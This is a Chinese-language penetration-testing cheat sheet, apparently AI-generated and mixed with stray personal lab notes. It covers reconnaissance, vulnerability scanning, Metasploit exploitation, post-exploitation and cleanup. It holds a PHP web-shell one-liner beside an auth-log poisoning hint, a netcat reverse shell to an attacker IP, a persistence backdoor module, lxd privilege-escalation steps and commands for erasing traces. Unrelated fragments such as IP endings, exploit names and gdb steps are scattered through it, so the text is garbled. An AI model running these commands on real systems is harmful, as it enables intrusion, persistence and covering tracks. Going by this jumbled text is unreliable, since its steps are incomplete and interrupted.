為了幫助新手快速上手滲透測試，我會為你生成一個簡明的cheatsheet，涵蓋基本工具和步驟。這份cheat sheet 主要包括常用命令和簡單的滲透測試流程。

- 常用的字典位置
    - /usr/share/wordlists/
    - `/usr/share/seclists/`
    - /usr/share/john/password.lst
    - /usr/share/john/wordlist.lst
    - `/usr/share/seclists/Usernames/`

### 滲透測試 Cheat Sheet [C]

### 1. **信息收集（Reconnaissance）**
	.6 site-editor
- **Ping 探測：**
    
    ```bash
    ping <目標IP>
    
    ```
	    '<?php system($_GET['cmd']); ?>'
  	/var/log/auth.log&cmd
- **網路掃描：**
    - Nmap
        
        ```bash
        nmap -Pn -sV <target IP>
        ```
        
    - 使用 Nmap 掃描開放端口：
        	.4 
        ```bash
        nmap -sS -Pn -A <目標IP>
        
        ```
        	ms17_010_ps
    - 使用 Nmap 扫描特定端口：
        	.5
        ```bash
        nmap -p <端口範圍> <目標IP>
        
        ```
        	gobuster/dirb cgi_bash
- **子域名枚舉：**
    - 使用`gobuster`爆破子域名:
        
        ```bash
        gobuster dir -u <target IP> -w /usr/share/wordlists/dirb/common.txt
        ```
        	.7
    - 使用 `sublist3r` 搜集子域名：
        	hydra(jason)
        ```bash
        sublist3r -d <目標域名>
        
        ```
        	ubuntu 18 lxd
    - 使用 `dnsenum` 查找 DNS 信息：
        
        ```bash
        dnsenum <目標域名>
        
        ```
        

### 2. **漏洞掃描（Vulnerability Scanning）** [PP]
	65.200
- **Nikto 網頁應用掃描：**
    	hydra(vag)
    ```bash
    nikto -h <目標IP或域名>
    ```
    
    - 常用選項
        - `h`: 指定要掃描的目標主機（IP地址或域名）。
        - `p`: 指定目標的端口（默認是 80）。
        - `ssl`: 用於掃描 HTTPS 網站（例如 `ssl` 或 `p 443`）。
        - `o`: 指定輸出文件，用於保存掃描結果。
        - `Format`: 指定輸出格式（例如 `html`, `csv`, `xml`）。
        - `Tuning`: 指定要進行的掃描類型（例如，檢查文件/CGI，檢查目標，隱藏頁面掃描等）。
        - `Plugins`: 列出所有可用插件。
- **OpenVAS 漏洞掃描：**
    1. 安裝並啟動 OpenVAS。
    2. 使用瀏覽器訪問 `https://<你的OpenVAS IP>:9392`。
    3. 創建新掃描任務並執行。
    - OpenVAS
        65.210
        ### OpenVAS 是什麼？
        burpsuite
        **OpenVAS** (Open Vulnerability Assessment System) 是一個開源的漏洞掃描器，用於自動化地檢查網絡和系統中的安全漏洞。它是 Greenbone Vulnerability Management (GVM) 的一部分，是一套完整的漏洞管理工具。OpenVAS 通過其豐富的插件庫來檢測數千種已知的漏洞，這些插件持續更新，以應對最新的安全威脅。
        dirtycow
        ### OpenVAS 的主要特點：
        5.100
        - **漏洞掃描**: 能夠對網絡中的各種設備進行全面的安全漏洞掃描。
        - **報告生成**: 生成詳細的報告，包含漏洞的描述、嚴重性等級和修復建議。
        - **插件庫**: 包含大量的漏洞檢測腳本（NVTs, Network Vulnerability Tests），這些腳本涵蓋了多種系統、應用和服務。
        - **靈活性**: 可定制的掃描設置，能夠針對特定的設備、服務或端口進行掃描。
        ssh_login(200
        ### 在 Kali Linux 中的安裝和使用
        5.0/24 1
        ### 1. **Kali Linux 是否自帶 OpenVAS？**
        portscan
        - **不再預裝**: 在過去的版本中，Kali Linux 曾經預裝 OpenVAS。然而，隨著 Kali 的演變，OpenVAS 並未被預裝在最新的版本中。你需要手動安裝 OpenVAS。
        smb_login
        ### 2. **手動安裝 OpenVAS**
        smb/psexec
        在 Kali Linux 中，你可以通過以下步驟來安裝和設置 OpenVAS：
        35.100
        1. **更新 Kali Linux 的軟件包列表**:
            ms17_010_command
            ```bash
            sudo apt-get update
            
            ```
            nbtstat -A
        2. **安裝 OpenVAS**:
            5.230
            Kali Linux 中的 OpenVAS 軟件包現在稱為 `gvm`（Greenbone Vulnerability Management）。你可以通過以下命令安裝它：
            portscan
            ```bash
            sudo apt-get install gvm
            
            ```
            ssh_login(jason)
        3. **初始化 GVM**:
            PwnKit - l - v - 230
            安裝完成後，初始化 GVM 數據庫和服務：
            
            ```bash
            sudo gvm-setup
            
            ```
            
            這步驟會下載並配置所需的資料庫和 NVT 插件，這可能需要一段時間，具體取決於你的網絡速度和系統配置。
        [A] =all   
        4. **啟動 GVM 服務**:
            .20
            初始化完成後，啟動 GVM 服務：
            smb/ps
            ```bash
            sudo gvm-start
            
            ```
            .50-90-20 rdp-hy-smb/p-route add-smb/p
        5. **訪問 GVM Web 界面**:
            .30
            GVM 啟動後，可以通過瀏覽器訪問其 Web 界面：
            hydra -smb/p (nla)-rdp
            - 預設 URL: `https://<your-kali-ip>:9392`
            - 預設用戶名: `admin`
            - 密碼會在 `gvm-setup` 完成後顯示，記得記錄下來。
        	.200-ms17_010_psexec-rdp-nbtstat -n
        ### 3. **使用 OpenVAS**
        .90	
        - **配置掃描任務**: 進入 GVM 的 Web 界面後，你可以創建新掃描任務，指定掃描目標、範圍以及其他設置。
        - **查看掃描結果**: 掃描完成後，可以查看詳細的報告，包括發現的漏洞及其修復建議。
        ms17_010_psexec
        ### 總結
        .70
        OpenVAS 是一個功能強大的開源漏洞掃描器，雖然 Kali Linux 最新版本並未預裝 OpenVAS，但你可以通過安裝 `gvm` 包來獲取並使用它。OpenVAS 提供了豐富的功能來幫助識別和管理網絡中的安全漏洞，是滲透測試和安全審計中的重要工具。
        ms17_010/eternal
- **OWASP ZAP 應用掃描：**
    1. 啟動 OWASP ZAP。
    2. 在 ZAP 中設置代理，並使用瀏覽器訪問目標網站。
    3. ZAP 自動捕獲並掃描流量。
[OT]
### 3. **漏洞利用（Exploitation）**
.105
- **Metasploit 框架：**
    - 啟動 Metasploit：
    portscan - hy(ke) -rp    
        ```bash
        msfconsole
        
        ```
     .230   
    - 搜索漏洞：
      hy(k) -ssh-sudo -s  
        ```bash
        search <漏洞名稱>
        
        ```
    tcpdump tcp port 502 -i eth0 -vv -w /tmp/test.cap    
    - 使用漏洞模塊：
        
        ```bash
        use <模塊名稱>
        
        ```
        
    - 設置參數：
  	[2io]    
        ```bash
        set RHOST <目標IP>
        set PAYLOAD <有效載荷> grep -nir
        
        ```
        .210 binwalk -e
      	```
       bash vim RootFlag210.txt BinariesRoot-210-3345 cat RootFlag210.txt | md5sum ```

    - 執行攻擊：
        gdb file level-teo binary
        ```bash
        exploit
        
        ```
        b main
      	info registers
	

- **SQL 注入測試：**
    - 使用 SQLMap 測試 SQL 注入：
        
        ```bash
        gdb 
        sqlmap -u <目標URL> --dbs
        p system
        
        ```
        

### 4. **後滲透（Post-Exploitation）**

- **收集信息：**
    - 列出使用者：
        
        ```bash
        find /bin/bash
        whoami
        
        ```
        
    - 查找敏感信息：
        
        ```bash
        find / -name "*.conf" 2>/dev/null
        gdb binaries-two
        ```
        
- **維持訪問：**
    - 建立反向 Shell：
        find /bin/bash
        ```bash
        nc -e /bin/bash <你的IP> <端口>
        
        ```
        
    - 使用 Metasploit 建立持久後門：
        
        ```bash
        use exploit/windows/local/persistence
        
        ```
        

### 5. **報告與清理（Reporting and Cleanup）**

- **生成報告：**
    - 使用工具如 Dradis 或 Faraday 收集測試結果。
- **清理痕跡：**
    - 清除 Bash 歷史：
        
        ```bash
        history -c
        
        ```
        
    - 刪除臨時文件：
        
        ```bash
        rm -rf /tmp/* /var/tmp/*
        
        ```

	lxc storage create mypool dir
	lxc profile device add default root disk path=/ pool=mypool


### 重要提示：

- 在任何情況下，請務必獲得合法授權後再進行滲透測試。
- 安全地保存和處理所有測試結果和報告。
